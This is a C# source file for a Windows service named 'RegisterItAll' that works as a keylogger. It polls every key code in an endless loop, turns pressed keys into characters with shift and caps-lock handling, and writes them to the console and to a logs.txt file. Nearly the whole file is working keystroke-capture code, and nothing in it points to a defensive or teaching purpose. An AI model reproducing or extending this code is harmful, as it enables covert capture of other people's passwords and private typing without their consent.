using RegisterItAll.Managers;
using System;
using System.IO;
using System.ServiceProcess;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RegisterItAll
{
    public partial class RegisterItAllService : ServiceBase
    {
        public void ExecuteAsConsoleApplication(string[] args)
        {
            this.OnStart(args);

            Console.ReadLine();

            this.OnStop();
        }

        protected override void OnStart(string[] args)
        {
            while (true)
            {
                try
                {
                    for (int key = 0; key < 255; key++)
                    {
                        if (!KeystrokesCapturer.IsPressed(key))
                        {
                            continue;
                        }

                        char? pressedKey = GetPressedKey(key);

                        if (pressedKey == null)
                        {
                            continue;
                        }

                        Console.WriteLine(pressedKey);
                        File.AppendAllText("logs.txt", pressedKey.ToString());
                    }
                }
                catch { }

                Task.Delay(50);
            }
        }

        private static char? GetPressedKey(int key)
        {
            if (Keys.OemPeriod.Equals((Keys)key)) return '.';
            else if (Keys.Space.Equals((Keys)key)) return ' ';
            else if (Keys.D0.Equals((Keys)key) || Keys.NumPad0.Equals((Keys)key)) return '0';
            else if (Keys.D1.Equals((Keys)key) || Keys.NumPad1.Equals((Keys)key)) return '1';
            else if (Keys.D2.Equals((Keys)key) || Keys.NumPad2.Equals((Keys)key)) return '2';
            else if (Keys.D3.Equals((Keys)key) || Keys.NumPad3.Equals((Keys)key)) return '3';
            else if (Keys.D4.Equals((Keys)key) || Keys.NumPad4.Equals((Keys)key)) return '4';
            else if (Keys.D5.Equals((Keys)key) || Keys.NumPad5.Equals((Keys)key)) return '5';
            else if (Keys.D6.Equals((Keys)key) || Keys.NumPad6.Equals((Keys)key)) return '6';
            else if (Keys.D7.Equals((Keys)key) || Keys.NumPad7.Equals((Keys)key)) return '7';
            else if (Keys.D8.Equals((Keys)key) || Keys.NumPad8.Equals((Keys)key)) return '8';
            else if (Keys.D9.Equals((Keys)key) || Keys.NumPad9.Equals((Keys)key)) return '9';
            else if (Keys.LButton.Equals((Keys)key) || Keys.MButton.Equals((Keys)key)) return null;

            if (key < 65 || key > 122)
            {
                return null;
            }

            if (KeystrokesCapturer.IsAsyncPressed(Keys.ShiftKey) && KeystrokesCapturer.IsPressed(Keys.CapsLock))
                return Convert.ToChar(key + 32);
            else if (KeystrokesCapturer.IsAsyncPressed(Keys.ShiftKey))
                return Convert.ToChar(key);
            else if (KeystrokesCapturer.IsPressed(Keys.CapsLock))
                return Convert.ToChar(key);
            else return Convert.ToChar(key + 32);
        }
    }
}